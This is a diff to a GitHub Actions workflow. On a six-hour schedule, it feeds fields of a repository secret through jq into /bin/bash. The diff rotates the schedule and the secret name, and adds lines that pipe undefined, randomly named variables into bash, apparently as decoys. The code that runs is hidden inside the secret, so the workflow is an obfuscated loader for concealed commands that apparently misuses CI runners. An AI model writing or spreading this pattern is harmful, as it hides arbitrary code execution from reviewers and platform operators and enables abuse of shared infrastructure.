@@ -1,24 +1,28 @@
 name: pengqi19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '54 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pengqi19871010
         env:
-          wrn90: ${{ secrets.wrn90 }}
+          xhul2449: ${{ secrets.xhul2449 }}
         run: |
-          echo $wrn90 | jq -r .v54 | /bin/bash
-          echo $n3 | jq -r .iflg094 | /bin/bash
-          echo $kbxo41 | jq -r .fg94 | /bin/bash
-          echo $rd4983 | jq -r .b15 | /bin/bash
-          echo $frj1 | jq -r .x777 | /bin/bash
-          echo $ihjx34011 | jq -r .jiu423 | /bin/bash
-          echo $a34927 | jq -r .vjbez8758 | /bin/bash
+          echo $xhul2449 | jq -r .wup45653 | /bin/bash
+          echo $hquxw767 | jq -r .gp88 | /bin/bash
+          echo $ixf39737 | jq -r .neo8563 | /bin/bash
+          echo $rmu07 | jq -r .gmtz19727 | /bin/bash
+          echo $qa9615 | jq -r .lrltc17283 | /bin/bash
+          echo $pihoo83696 | jq -r .s37013 | /bin/bash
+          echo $lt55 | jq -r .vw88188 | /bin/bash
+          echo $weza75 | jq -r .xeswa9622 | /bin/bash
+          echo $x801 | jq -r .kgu3098 | /bin/bash
+          echo $z7540 | jq -r .rd3 | /bin/bash
+          echo $ja88349 | jq -r .wt76 | /bin/bash
 
